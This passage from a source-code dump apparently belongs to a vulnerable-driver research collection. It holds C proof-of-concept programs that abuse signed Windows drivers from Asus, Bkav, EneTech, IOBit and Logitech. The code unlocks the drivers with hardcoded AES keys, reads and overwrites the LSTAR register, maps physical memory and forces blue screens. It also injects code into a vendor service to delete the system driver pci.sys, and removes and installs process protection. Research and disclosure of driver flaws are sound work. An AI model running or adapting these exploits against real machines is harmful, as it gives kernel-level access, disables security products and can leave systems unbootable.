    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

int main()
{
    //
    // Uncomment to generate unlocking resource.
    //
  /*  
    AES_ctx ctx;
    DWORD a[4] = { 0x16157EAA, 0xA6D2AE28, 0x8815F7AB, 0x3C4FCF09 };
    BYTE Buffer[16];
    AES_init_ctx(&ctx, (uint8_t*)a);
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;
    GetSystemTimePreciseAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlCopyMemory(Buffer, &seconds, sizeof(DWORD));
    AES_ECB_encrypt(&ctx, (uint8_t*)Buffer);
    supWriteBufferToFile((LPWSTR)L"ASUSCERT.bin", Buffer, sizeof(Buffer));
    return;
    */

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\Asusgio2"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] Asusgio2 device opened\r\n");
    }


    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    UCHAR dBuffer[100];

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        0xA0402450,
        &dBuffer,
        1024,
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);

    return 0;
}

```

`source/SecTrash/bkavsp.c`:

```c
#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900)
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

typedef NTSTATUS(NTAPI* pfnNtDeviceIoControlFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

typedef int (WINAPI* pfnMessageBoxA)(
    _In_opt_ HWND hWnd,
    _In_opt_ LPCSTR lpText,
    _In_opt_ LPCSTR lpCaption,
    _In_ UINT uType);

typedef HANDLE(WINAPI* pfnCreateFileA)(
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile);

typedef NTSTATUS(NTAPI* pfnRtlExitUserThread)(
    _In_ NTSTATUS ExitStatus);

typedef int(__cdecl* psprintf_s)(
    char* buffer,
    size_t sizeOfBuffer,
    const char* format,
    ...);

typedef struct tagLOAD_PARAMETERS {
    CHAR szDeviceName[100];
    CHAR szMessage[100];
    WCHAR szFileToDelete[MAX_PATH];
    pfnNtDeviceIoControlFile NtDeviceIoControlFile;
    pfnCreateFileA CreateFileA;
    pfnRtlExitUserThread RtlExitUserThread;
    pfnMessageBoxA MessageBoxA;
    psprintf_s sprintf_s;
} LOAD_PARAMETERS, * PLOAD_PARAMETERS;

LOAD_PARAMETERS g_LoadParameters;

#include "minirtl\minirtl.h"

HANDLE NTAPI supRunProcessAsInvoker(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _In_opt_ LPWSTR lpApplicationName,
    _Out_opt_ HANDLE* PrimaryThread
)
{
    BOOL bResult = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT;
    PVOID pEnvironment;
    UNICODE_STRING valueName, valueData;

    if (PrimaryThread)
        *PrimaryThread = NULL;

    if (lpszParameters == NULL)
        return NULL;

    ccb = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ccb);
    if (pszBuffer == NULL)
        return NULL;

    _strcpy(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    if (NT_SUCCESS(RtlCreateEnvironment(TRUE, &pEnvironment))) {

        RtlInitUnicodeString(&valueName, L"__COMPAT_LAYER");
        RtlInitUnicodeString(&valueData, L"RUNASINVOKER");

        if (NT_SUCCESS(RtlSetEnvironmentVariable(&pEnvironment,
            &valueName, &valueData)))
        {
            bResult = CreateProcess(
                lpApplicationName,
                pszBuffer,
                NULL,
                NULL,
                FALSE,
                dwFlags | CREATE_SUSPENDED,
                pEnvironment,
                lpCurrentDirectory,
                &si,
                &pi);

            if (bResult) {
                if (PrimaryThread) {
                    *PrimaryThread = pi.hThread;
                }
                else {
                    CloseHandle(pi.hThread);
                }
            }
        }

        RtlDestroyEnvironment(pEnvironment);
    }
    HeapFree(GetProcessHeap(), 0, pszBuffer);
    return pi.hProcess;
}

DWORD WINAPI ShellProc(
    _In_ LOAD_PARAMETERS* Params
)
{
    IO_STATUS_BLOCK ioStatus;
    CHAR Buffer[1024];

    CHAR szFailed[] = { 'F', 'a', 'i', 'l', 'e', 'd', 0 };
    CHAR szSuccess[] = { 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
    CHAR szTemp[] = { '%', 'l', 'x', 0 };


    HANDLE deviceHandle = Params->CreateFileA(Params->szDeviceName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle != INVALID_HANDLE_VALUE) {

        Params->MessageBoxA(0, Params->szMessage, szSuccess, 0);
    
        NTSTATUS status = Params->NtDeviceIoControlFile(deviceHandle,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            0x22E141,
            &Params->szFileToDelete,
            MAX_PATH * sizeof(WCHAR),
            NULL,
            0);

        if (NT_SUCCESS(status))
        {
            Params->MessageBoxA(0, szSuccess, szSuccess, 0);
        }
        else {
            Params->sprintf_s(Buffer, 200, szTemp, status);
            Params->MessageBoxA(0, Buffer, szFailed, 0);
        }

    }
    else {
        Params->MessageBoxA(0, szFailed, NULL, 0);
    }

    return Params->RtlExitUserThread(0);
}


int main()
{
    HINSTANCE hKernel = GetModuleHandle(TEXT("kernel32.dll"));
    HINSTANCE hNtdll = GetModuleHandle(TEXT("ntdll.dll"));
    LPVOID    RemoteCode = NULL, newEp, newDp;

    HINSTANCE InjectorImageBase = GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS NtHeaders = RtlImageNtHeader(InjectorImageBase);

    PLOAD_PARAMETERS LoadParams = &g_LoadParameters;
    PVOID LoadProc = ShellProc;
    HANDLE hProcess;

    _strcpy_a(LoadParams->szDeviceName, "\\\\.\\BkavSP");
    _strcpy_a(LoadParams->szMessage, "Device BkavSP opened\r\n");
    _strcpy(LoadParams->szFileToDelete, L"C:\\windows\\system32\\drivers\\pci.sys");

    LoadParams->CreateFileA = (pfnCreateFileA)GetProcAddress(hKernel, "CreateFileA");

    LoadParams->NtDeviceIoControlFile = (pfnNtDeviceIoControlFile)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
    LoadParams->RtlExitUserThread = (pfnRtlExitUserThread)GetProcAddress(hNtdll, "RtlExitUserThread");
    LoadParams->sprintf_s = (psprintf_s)GetProcAddress(hNtdll, "sprintf_s");

    LoadParams->MessageBoxA = (pfnMessageBoxA)GetProcAddress(GetModuleHandle(L"user32.dll"), "MessageBoxA");


    hProcess = supRunProcessAsInvoker((LPWSTR)L"C:\\Windows\\system32\\BkavService.exe", NULL, NULL, NULL);
    if (hProcess == NULL) {
        MessageBox(GetDesktopWindow(), L"Could not start target process", NULL, 0);
        return -1;
    }

    SIZE_T memIO = (SIZE_T)NtHeaders->OptionalHeader.SizeOfImage;
    NTSTATUS ntStatus;

    ntStatus = NtAllocateVirtualMemory(
        hProcess,
        &RemoteCode,
        0,
        &memIO,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"NtAllocateVirtualMemory error", NULL, 0);
        return -2;
    }

    memIO = (SIZE_T)NtHeaders->OptionalHeader.SizeOfImage;

    ntStatus = NtWriteVirtualMemory(
        hProcess,
        RemoteCode,
        InjectorImageBase,
        memIO,
        &memIO);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"NtWriteVirtualMemory error", NULL, 0);
        return -3;
    }

    newEp = (char*)RemoteCode + ((char*)LoadProc - (char*)InjectorImageBase);
    newDp = (char*)RemoteCode + ((char*)LoadParams - (char*)InjectorImageBase);

    HANDLE hRemoteThread;

    ntStatus = RtlCreateUserThread(
        hProcess,
        NULL,
        FALSE,
        0,
        0,
        0,
        (PUSER_THREAD_START_ROUTINE)newEp,
        newDp,
        &hRemoteThread,
        NULL);

    if (!NT_SUCCESS(ntStatus)) {
        MessageBox(GetDesktopWindow(), L"RtlCreateUserThread error", NULL, 0);
        return -4;
    }

    if (hRemoteThread) {
        WaitForSingleObject(hRemoteThread, INFINITE);
        NtClose(hRemoteThread);
    }

    if (hProcess) {
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }

    return 0;
}

```

`source/SecTrash/enetech.c`:

```c
#include <windows.h>
#include <cstdio>
#include "ntos.h"

#define WINIO_DEVICE_TYPE      (DWORD)0x8010 
#define WINIO_READMSR          (DWORD)0x816

#define IOCTL_WINIO_READMSR     \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define WINIO_MAP_FUNCID     (DWORD)0x810
#define WINIO_UNMAP_FUNCID   (DWORD)0x811

#define IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY     \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_MAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102040

#define IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY   \
    CTL_CODE(WINIO_DEVICE_TYPE, WINIO_UNMAP_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80102044


#ifdef __cplusplus
extern "C" {
#include "aes.h"
}
#endif

typedef struct _WINIO_PHYSICAL_MEMORY_INFO_EX {
    ULONG_PTR CommitSize;
    ULONG_PTR BusAddress;
    HANDLE SectionHandle;
    PVOID BaseAddress;
    PVOID ReferencedObject;
    UCHAR EncryptedKey[16];
} WINIO_PHYSICAL_MEMORY_INFO_EX, * PWINIO_PHYSICAL_MEMORY_INFO_EX;

typedef struct _WINIO_READ_MSR_INPUT {
    ULONG Msr;
    UCHAR EncryptedKey[16];
} WINIO_READ_MSR_INPUT, * PWINIO_READ_MSR_INPUT;

typedef struct _WINIO_READ_MSR_OUTPUT {
    ULONG MsrLow;
    UCHAR SpareBytes[16];
    ULONG MsrHigh;
} WINIO_READ_MSR_OUTPUT, * PWINIO_READ_MSR_OUTPUT;

ULONG g_UnlockKey[4] = { 0x54454E45, 0x4E484345, 0x474F4C4F, 0x434E4959 };

ULONG GetTimeAsSecondsSince1970()
{
    LARGE_INTEGER fileTime;
    ULONG seconds = 0;

    GetSystemTimePreciseAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);
    return seconds;
}

BOOL WinIoCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

PVOID WinIoMapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle,
    _Out_ PVOID* ReferencedObject)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    *SectionHandle = NULL;
    *ReferencedObject = NULL;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.CommitSize = NumberOfBytes;
    request.BusAddress = PhysicalAddress;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(seconds));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    if (WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        *ReferencedObject = request.ReferencedObject;
        return request.BaseAddress;
    }

    return NULL;
}

VOID WinIoUnmapMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap,
    _In_ HANDLE SectionHandle,
    _In_ PVOID ReferencedObject
)
{
    AES_ctx ctx;
    WINIO_PHYSICAL_MEMORY_INFO_EX request;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    RtlSecureZeroMemory(&request, sizeof(request));
    request.BaseAddress = SectionToUnmap;
    request.ReferencedObject = ReferencedObject;
    request.SectionHandle = SectionHandle;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&request.EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (UCHAR*)&request.EncryptedKey);

    WinIoCallDriver(DeviceHandle,
        IOCTL_WINIO_UNMAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\EneTechIo"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] EneTechIo device opened\r\n");
    }

    AES_ctx ctx;
    WINIO_READ_MSR_INPUT* inBuf;
    WINIO_READ_MSR_OUTPUT* outBuf;

    PVOID dataPtr;
    BYTE inOutBuffer[512];


    RtlSecureZeroMemory(&inOutBuffer, sizeof(inOutBuffer));
    inBuf = (WINIO_READ_MSR_INPUT*)&inOutBuffer;
    outBuf = (WINIO_READ_MSR_OUTPUT*)&inOutBuffer;
    dataPtr = &inOutBuffer;

    RtlSecureZeroMemory(&ctx, sizeof(ctx));
    AES_init_ctx(&ctx, (uint8_t*)&g_UnlockKey);

    inBuf->Msr = 0xC0000082;

    ULONG seconds = GetTimeAsSecondsSince1970();

    RtlCopyMemory(&inBuf->EncryptedKey, (PVOID)&seconds, sizeof(ULONG));
    AES_ECB_encrypt(&ctx, (uint8_t*)&inBuf->EncryptedKey);

    NTSTATUS ntStatus = WinIoCallDriver(deviceHandle,
        IOCTL_WINIO_READMSR,
        dataPtr,
        sizeof(WINIO_READ_MSR_INPUT),
        dataPtr,
        sizeof(WINIO_READ_MSR_OUTPUT));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed to read LSTAR, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {
        LARGE_INTEGER value;
        value.LowPart = outBuf->MsrLow;
        value.HighPart = outBuf->MsrHigh;
        printf_s("[+] IOCTL %lu succeeded, LSTAR = 0x%llx\r\n", IOCTL_WINIO_READMSR, value.QuadPart);
    }

    HANDLE sectionHandle;
    PVOID refObject;
    PVOID mappedMemory;

    mappedMemory = WinIoMapMemory2(deviceHandle,
        0x12000,
        1024 * 1024,
        &sectionHandle,
        &refObject);

    if (mappedMemory) {

        printf_s("[+] IOCTL %lu succeeded, physmem mapped\r\n", IOCTL_WINIO_MAP_USER_PHYSICAL_MEMORY);

        WinIoUnmapMemory2(deviceHandle,
            mappedMemory,
            sectionHandle,
            refObject);
    }
    else {
        printf_s("[!] Could not map physical memory\r\n");
    }

    CloseHandle(deviceHandle);

    return 0;
}

```

`source/SecTrash/glckio2.c`:

```c
#include "ntos.h"

#define GLCKIO_DEVICE_TYPE      (DWORD)0x8010 //same as WinIO/MsIo and all clones based on this bugfest code
#define GLCKIO_REGISTER_FUNCID  (DWORD)0x818
#define GLCKIO_READMSR          (DWORD)0x816


#define IOCTL_GKCKIO_REGISTER     \
    CTL_CODE(GLCKIO_DEVICE_TYPE, GLCKIO_REGISTER_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GKCKIO_READMSR     \
    CTL_CODE(GLCKIO_DEVICE_TYPE, GLCKIO_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)


#ifdef __cplusplus
extern "C" {
#include "aes.h" //they are using TinyAes (https://github.com/kokke/tiny-AES-c)
}
#endif

#define SWAP_UINT32(x) (((x) >> 24) | (((x) & 0x00FF0000) >> 8) | (((x) & 0x0000FF00) << 8) | ((x) << 24))

BOOL MsioCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\GLCKIo2"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }

    AES_ctx ctx;
    UCHAR Buffer[16];
    ULONG bytesReturned = 0;
    ULONG_PTR encryptedProcessId;
    IO_STATUS_BLOCK iost;

    BYTE OutBuf[512];
    ULONG AES128Key[4] = { 0x16157eaa, 0xa6d2ae28, 0x8815f7ab, 0x3c4fcf09 };//hardcoded and a little altered value found by authors in google

    RtlSecureZeroMemory(&ctx, sizeof(ctx));

    AES_init_ctx(&ctx, (uint8_t*)&AES128Key);

    encryptedProcessId = SWAP_UINT32(GetCurrentProcessId());

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));
    RtlCopyMemory(&Buffer, &encryptedProcessId, sizeof(ULONG_PTR));
    AES_ECB_encrypt(&ctx, (uint8_t*)&Buffer);

    NTSTATUS ntStatus = NtDeviceIoControlFile(deviceHandle,
        NULL,
        NULL,
        NULL,
        &iost,
        IOCTL_GKCKIO_REGISTER,
        &Buffer,
        sizeof(Buffer),
        &OutBuf,
        sizeof(OutBuf));

    if (!NT_SUCCESS(ntStatus))
        Beep(0, 0);

    ULONG_PTR msr = 0xC0000082; //lstar

    MsioCallDriver(deviceHandle,
        IOCTL_GKCKIO_READMSR,
        &msr,
        sizeof(msr),
        &msr,
        sizeof(msr));

    printf_s("LSTAR = 0x%llx\r\n", msr);

    CloseHandle(deviceHandle);

    return 0;
}

```

`source/SecTrash/iobit_winring0.c`:

```c
#include <windows.h>
#include "ntos.h"
#include <cstdio>

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

#define OLS_TYPE 40000

#define IOCTL_OLS_GET_DRIVER_VERSION \
	CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_MSR \
	CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_WRITE_MSR \
	CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

#pragma pack(push,4)

typedef struct  _OLS_WRITE_MSR_INPUT {
    ULONG		Register;
    ULARGE_INTEGER	Value;
}   OLS_WRITE_MSR_INPUT;

#pragma pack(pop)

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\IOBIT_WinRing0_1_3_0"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] IOBIT_WinRing0_1_3_0 device opened\r\n");
    }

    DWORD driverVersion = 0;

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_GET_DRIVER_VERSION,
        &driverVersion,
        sizeof(ULONG),
        &driverVersion,
        sizeof(ULONG));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_GET_DRIVER_VERSION failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {

        printf_s("[+] WinRing0 version = %lu.%lu.%lu.%lu\r\n",
            (driverVersion >> 24) & 0xFF,
            (driverVersion >> 16) & 0xFF,
            (driverVersion >> 8) & 0xFF,
            (driverVersion) & 0xFF);

    }

    LARGE_INTEGER msr;
    ULONG lstar = 0xC0000082;

    msr.QuadPart = 0;

    ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_READ_MSR,
        &lstar,
        sizeof(ULONG),
        &msr,
        sizeof(msr));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_READ_MSR failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    printf_s("[+] LSTAR = 0x%p\r\n", (PVOID)msr.QuadPart);

    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    OLS_WRITE_MSR_INPUT inBuf;

    inBuf.Register = lstar;
    inBuf.Value.HighPart = 0xFFFFFFFF;
    inBuf.Value.LowPart = 0xFFFFFFFF;

    SetThreadAffinityMask(GetCurrentThread(), (DWORD)-1);

    ntStatus = CallDriver(deviceHandle,
        IOCTL_OLS_WRITE_MSR,
        &inBuf,
        sizeof(inBuf),
        &lstar,
        sizeof(lstar));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] IOCTL_OLS_WRITE_MSR failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);

    return 0;
}

```

`source/SecTrash/iobitcallbacks.c`:

```c
#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

typedef struct _CALL_DRV {
    ULONG Value1;
    ULONG Value2;
    HANDLE Pid1;
    HANDLE Pid2;
    BYTE Spare[392];
} CALL_DRV, * PCALL_DRV;

int main()
{
    NTSTATUS ntStatus;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\ImfObCallback"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] ImfObCallback device opened\r\n");
    }

    //
    // Remove protection from IOBit processes.
    // IMF.exe
    // IMFCore.exe
    //

    ntStatus = CallDriver(deviceHandle,
        0x22200C,
        NULL,
        0,
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        printf_s("[~] Protection removed\r\n");
    }
    else {
        printf_s("[~] Error (NTSTATUS 0x%lx)\r\n", ntStatus);
    }

    system("pause");

    //
    // Protect ourself.
    //

    CALL_DRV request;
    DWORD procId1 = GetCurrentProcessId(), procId2;

    GetWindowThreadProcessId(GetDesktopWindow(), &procId2); //anything else
    
    RtlZeroMemory(&request, sizeof(request));

    request.Pid1 = UlongToHandle(procId1);
    request.Pid2 = UlongToHandle(procId2);

    ntStatus = CallDriver(deviceHandle,
        0x222008,
        &request,
        sizeof(request),
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        printf_s("[~] Protection installed, try to kill me\r\n");
    }
    else {
        printf_s("[~] Error (NTSTATUS 0x%lx)\r\n", ntStatus);
    }

    system("pause");

    CloseHandle(deviceHandle);
}

```

`source/SecTrash/logitech.c`:

```c
#include <windows.h>
#include <cstdio>
#include "ntos.h"

#define LG_DEVICE_TYPE      (DWORD)0xC350
#define LG_READVALUE        (DWORD)0x800
#define LG_READREFCOUNT     (DWORD)0x801
#define LG_READMSR          (DWORD)0x821

#define IOCTL_LG_READVALUE     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READVALUE, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_LG_READREFCOUNT     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READREFCOUNT, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_LG_READMSR     \
    CTL_CODE(LG_DEVICE_TYPE, LG_READMSR, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _LG_READ_MSR {
    ULONG Affinity;
    ULONG Msr;
} LG_READ_MSR, * PLG_READ_MSR;

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\lgHwAccess"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
        return -1;
    }
    else {
        printf_s("[+] lgHwAccess device opened\r\n");
    }

    LG_READ_MSR request;
    ULONG_PTR msrLstar = 0;
    
    request.Affinity = (DWORD)-1;
    request.Msr = 0xC0000082;

    NTSTATUS ntStatus = CallDriver(deviceHandle,
        IOCTL_LG_READMSR,
        &request,
        sizeof(request),
        &msrLstar,
        sizeof(msrLstar));

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed to read LSTAR, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {

        printf_s("[+] IOCTL %lu succeeded, LSTAR = 0x%llx\r\n", IOCTL_LG_READMSR, msrLstar);
    }

    printf_s("[+] Hit any key to BSOD\r\n");
    system("pause");

    ULONG_PTR value = 0xfffff8041ad76d18;

    ntStatus = CallDriver(deviceHandle,
        IOCTL_LG_READVALUE,
        (PVOID)0xfffff801447e6d18,
        0,
        NULL,
        0);

    if (!NT_SUCCESS(ntStatus)) {
        printf_s("[!] Failed, NTSTATUS (0x%lX)\r\n", ntStatus);
    }
    else {
        printf_s("[+] IOCTL %lu succeeded\r\n", IOCTL_LG_READREFCOUNT);
    }

    CloseHandle(deviceHandle);

    return 0;
}

```

`source/SecTrash/maxproc64.c`:

```c
int main()
{
    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\MaxProc64"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
